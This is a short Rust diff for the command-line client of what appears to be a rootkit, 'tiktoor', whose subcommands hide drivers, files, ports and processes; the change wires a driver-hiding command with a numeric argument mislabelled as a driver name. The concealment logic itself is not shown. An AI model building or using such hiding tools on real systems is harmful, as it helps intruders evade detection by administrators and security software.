@@ -4,7 +4,11 @@ use structopt::StructOpt;
 #[derive(StructOpt)]
 enum Cli {
     /// Hide driver
-    DriverHiding,
+    DriverHiding{
+        /// driver name
+        #[structopt(short, long)]
+        rank: u32,
+    },
     /// Hide file
     FileHiding,
     /// Hide port
@@ -27,7 +31,7 @@ fn main() {
     let cli = Cli::from_args();
 
     match cli {
-        Cli::DriverHiding => {}
+        Cli::DriverHiding { rank } => tiktoor_client::hide_driver(rank),
         Cli::FileHiding => {}
         Cli::PortHiding => {}
         Cli::ProcessHiding { pid } => tiktoor_client::hide_process(pid),
